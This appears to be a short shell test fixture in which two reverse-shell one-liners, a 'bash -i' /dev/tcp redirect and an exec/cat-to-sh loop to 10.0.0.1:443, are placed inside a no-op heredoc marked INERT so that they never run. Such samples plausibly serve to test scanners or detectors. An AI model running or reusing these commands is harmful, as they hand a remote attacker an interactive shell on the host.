: <<'INERT'
bash   -i    >&  /dev/tcp/10.0.0.1/443   0>&1
exec 5<>/dev/tcp/10.0.0.1/443; cat <&5 | sh >&5
INERT
echo inert
